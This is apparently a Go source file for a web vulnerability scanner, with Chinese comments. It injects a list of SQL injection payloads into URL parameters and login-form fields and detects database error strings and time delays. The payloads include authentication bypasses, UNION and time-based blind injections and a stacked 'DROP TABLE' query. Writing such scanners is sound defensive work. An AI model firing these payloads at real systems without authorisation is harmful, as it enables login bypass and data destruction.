package webscan

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// SQLiResult SQL Injection 偵測結果
type SQLiResult struct {
	URL       string
	Parameter string
	Payload   string
	Evidence  string
	RiskLevel string
}

// SQLiScanner SQL Injection 掃描器
type SQLiScanner struct {
	TargetURL string
	client    *http.Client
	Results   []SQLiResult
}

// SQL 錯誤特徵 — 代表注入成功觸發了 SQL 錯誤
var sqlErrorPatterns = []struct {
	Pattern string
	DBType  string
}{
	{"you have an error in your sql syntax", "MySQL"},
	{"warning.*mysql", "MySQL"},
	{"unclosed quotation mark", "MSSQL"},
	{"microsoft ole db provider for sql server", "MSSQL"},
	{"mssql_query()", "MSSQL"},
	{"microsoft sql native client error", "MSSQL"},
	{"ora-[0-9]{5}", "Oracle"},
	{"oracle error", "Oracle"},
	{"oracle.*driver", "Oracle"},
	{"pg_query()", "PostgreSQL"},
	{"psql.*error", "PostgreSQL"},
	{"unterminated quoted string", "PostgreSQL"},
	{"sqlite.*error", "SQLite"},
	{"sqlite3.*", "SQLite"},
	{"sql syntax.*error", "Generic SQL"},
	{"syntax error.*sql", "Generic SQL"},
	{"unexpected end of sql command", "Generic SQL"},
	{"invalid query", "Generic SQL"},
	{"sql command not properly ended", "Generic SQL"},
	{"quoted string not properly terminated", "Generic SQL"},
}

// SQL Injection 測試 payload
var sqliPayloads = []struct {
	Payload string
	Desc    string
}{
	{"'", "單引號注入"},
	{"\"", "雙引號注入"},
	{"' OR '1'='1", "OR 邏輯繞過"},
	{"' OR '1'='1' --", "OR 邏輯繞過 (含註解)"},
	{"' OR '1'='1' #", "OR 邏輯繞過 (MySQL 註解)"},
	{"1' ORDER BY 1--", "ORDER BY 欄位探測"},
	{"1 UNION SELECT NULL--", "UNION 注入"},
	{"' AND '1'='2", "AND FALSE (應無結果)"},
	{"1; DROP TABLE test--", "堆疊查詢測試"},
	{"' WAITFOR DELAY '0:0:3'--", "MSSQL 時間盲注"},
	{"' AND SLEEP(3)--", "MySQL 時間盲注"},
	{"1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "MySQL 子查詢盲注"},
}

// NewSQLiScanner 建立 SQLi 掃描器
func NewSQLiScanner(targetURL string) *SQLiScanner {
	return &SQLiScanner{
		TargetURL: targetURL,
		client: &http.Client{
			Timeout: 10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

// ScanURL 對 URL 參數進行 SQL Injection 測試
func (ss *SQLiScanner) ScanURL() []SQLiResult {
	parsed, err := url.Parse(ss.TargetURL)
	if err != nil {
		return nil
	}

	params := parsed.Query()
	if len(params) == 0 {
		fmt.Println("      URL 無參數，跳過 URL 參數注入測試")
		return nil
	}

	fmt.Printf("      偵測到 %d 個 URL 參數: %v\n", len(params), getParamNames(params))

	for paramName := range params {
		ss.testParameter(parsed, paramName)
	}

	return ss.Results
}

// ScanLoginForm 對登入表單進行 SQL Injection 測試
func (ss *SQLiScanner) ScanLoginForm(loginURL string, form *FormInfo) []SQLiResult {
	if form == nil {
		return nil
	}

	fmt.Printf("      對登入表單進行 SQL Injection 測試...\n")

	// 先取得正常回應作為基準
	normalData := url.Values{}
	if form.UsernameField != "" {
		normalData.Set(form.UsernameField, "testuser123")
	}
	normalData.Set(form.PasswordField, "testpass123")
	for k, v := range form.ExtraFields {
		normalData.Set(k, v)
	}

	normalResp, normalBody, err := ss.postForm(form.ActionURL, normalData)
	if err != nil {
		return nil
	}
	normalLen := len(normalBody)

	// 對帳號欄位注入
	if form.UsernameField != "" {
		ss.testFormField(form, form.UsernameField, normalResp, normalBody, normalLen)
	}

	// 對密碼欄位注入
	ss.testFormField(form, form.PasswordField, normalResp, normalBody, normalLen)

	return ss.Results
}

// testParameter 測試單一 URL 參數
func (ss *SQLiScanner) testParameter(parsed *url.URL, paramName string) {
	originalValue := parsed.Query().Get(paramName)

	// 先取得正常回應
	normalBody := ss.getBody(ss.TargetURL)
	normalLen := len(normalBody)

	for _, payload := range sqliPayloads {
		// 組裝注入 URL
		q := parsed.Query()
		q.Set(paramName, originalValue+payload.Payload)
		testURL := *parsed
		testURL.RawQuery = q.Encode()

		startTime := time.Now()
		body := ss.getBody(testURL.String())
		elapsed := time.Since(startTime)

		// 檢查 SQL 錯誤訊息
		if evidence := checkSQLError(body); evidence != "" {
			result := SQLiResult{
				URL:       testURL.String(),
				Parameter: paramName,
				Payload:   payload.Payload,
				Evidence:  fmt.Sprintf("SQL 錯誤: %s (%s)", evidence, payload.Desc),
				RiskLevel: "嚴重",
			}
			ss.Results = append(ss.Results, result)
			fmt.Printf("      [!!!] 發現 SQL Injection! 參數=%s, Payload=%s\n", paramName, payload.Payload)
			fmt.Printf("            證據: %s\n", evidence)
			continue
		}

		// 檢查時間盲注 (回應時間 > 2.5 秒)
		if strings.Contains(payload.Payload, "SLEEP") || strings.Contains(payload.Payload, "WAITFOR") {
			if elapsed > 2500*time.Millisecond {
				result := SQLiResult{
					URL:       testURL.String(),
					Parameter: paramName,
					Payload:   payload.Payload,
					Evidence:  fmt.Sprintf("時間盲注: 回應耗時 %v (%s)", elapsed.Round(time.Millisecond), payload.Desc),
					RiskLevel: "嚴重",
				}
				ss.Results = append(ss.Results, result)
				fmt.Printf("      [!!!] 發現時間盲注! 參數=%s, 延遲=%v\n", paramName, elapsed.Round(time.Millisecond))
				continue
			}
		}

		// 檢查 OR 繞過 (回應長度明顯不同)
		if strings.Contains(payload.Payload, "OR") && normalLen > 0 {
			diff := len(body) - normalLen
			if diff < 0 {
				diff = -diff
			}
			ratio := float64(diff) / float64(normalLen)
			if ratio > 0.5 {
				result := SQLiResult{
					URL:       testURL.String(),
					Parameter: paramName,
					Payload:   payload.Payload,
					Evidence:  fmt.Sprintf("回應長度差異 %.0f%% (%s) — 可能存在注入，建議人工驗證", ratio*100, payload.Desc),
					RiskLevel: "高",
				}
				ss.Results = append(ss.Results, result)
				fmt.Printf("      [!] 可疑: 參數=%s, Payload=%s, 回應差異=%.0f%%\n", paramName, payload.Payload, ratio*100)
			}
		}
	}
}

// testFormField 測試表單欄位的 SQL Injection
func (ss *SQLiScanner) testFormField(form *FormInfo, fieldName string, normalResp *http.Response, normalBody string, normalLen int) {
	for _, payload := range sqliPayloads {
		data := url.Values{}
		for k, v := range form.ExtraFields {
			data.Set(k, v)
		}

		if fieldName == form.UsernameField {
			data.Set(form.UsernameField, payload.Payload)
			data.Set(form.PasswordField, "testpass123")
		} else {
			if form.UsernameField != "" {
				data.Set(form.UsernameField, "testuser123")
			}
			data.Set(form.PasswordField, payload.Payload)
		}

		startTime := time.Now()
		_, body, err := ss.postForm(form.ActionURL, data)
		elapsed := time.Since(startTime)
		if err != nil {
			continue
		}

		// 檢查 SQL 錯誤訊息
		if evidence := checkSQLError(body); evidence != "" {
			result := SQLiResult{
				URL:       form.ActionURL,
				Parameter: fieldName,
				Payload:   payload.Payload,
				Evidence:  fmt.Sprintf("SQL 錯誤: %s (%s)", evidence, payload.Desc),
				RiskLevel: "嚴重",
			}
			ss.Results = append(ss.Results, result)
			fmt.Printf("      [!!!] 發現 SQL Injection! 欄位=%s, Payload=%s\n", fieldName, payload.Payload)
			fmt.Printf("            證據: %s\n", evidence)
			continue
		}

		// 檢查時間盲注
		if strings.Contains(payload.Payload, "SLEEP") || strings.Contains(payload.Payload, "WAITFOR") {
			if elapsed > 2500*time.Millisecond {
				result := SQLiResult{
					URL:       form.ActionURL,
					Parameter: fieldName,
					Payload:   payload.Payload,
					Evidence:  fmt.Sprintf("時間盲注: 回應耗時 %v (%s)", elapsed.Round(time.Millisecond), payload.Desc),
					RiskLevel: "嚴重",
				}
				ss.Results = append(ss.Results, result)
				fmt.Printf("      [!!!] 發現時間盲注! 欄位=%s, 延遲=%v\n", fieldName, elapsed.Round(time.Millisecond))
				continue
			}
		}

		// OR 繞過檢測
		if strings.Contains(payload.Payload, "OR") && normalLen > 0 {
			diff := len(body) - normalLen
			if diff < 0 {
				diff = -diff
			}
			ratio := float64(diff) / float64(normalLen)
			if ratio > 0.5 {
				result := SQLiResult{
					URL:       form.ActionURL,
					Parameter: fieldName,
					Payload:   payload.Payload,
					Evidence:  fmt.Sprintf("回應長度差異 %.0f%% (%s) — 可能存在注入", ratio*100, payload.Desc),
					RiskLevel: "高",
				}
				ss.Results = append(ss.Results, result)
				fmt.Printf("      [!] 可疑: 欄位=%s, Payload=%s, 回應差異=%.0f%%\n", fieldName, payload.Payload, ratio*100)
			}
		}
	}
}

// === 輔助函式 ===

func (ss *SQLiScanner) getBody(targetURL string) string {
	resp, err := ss.client.Get(targetURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	return string(bodyBytes)
}

func (ss *SQLiScanner) postForm(targetURL string, data url.Values) (*http.Response, string, error) {
	resp, err := ss.client.PostForm(targetURL, data)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	return resp, string(bodyBytes), nil
}

func checkSQLError(body string) string {
	bodyLower := strings.ToLower(body)
	for _, pattern := range sqlErrorPatterns {
		re, err := regexp.Compile("(?i)" + pattern.Pattern)
		if err != nil {
			// fallback to simple string match
			if strings.Contains(bodyLower, strings.ToLower(pattern.Pattern)) {
				return fmt.Sprintf("%s (%s)", pattern.Pattern, pattern.DBType)
			}
			continue
		}
		if match := re.FindString(bodyLower); match != "" {
			return fmt.Sprintf("%s (%s)", match, pattern.DBType)
		}
	}
	return ""
}

func getParamNames(params url.Values) []string {
	var names []string
	for k := range params {
		names = append(names, k)
	}
	return names
}
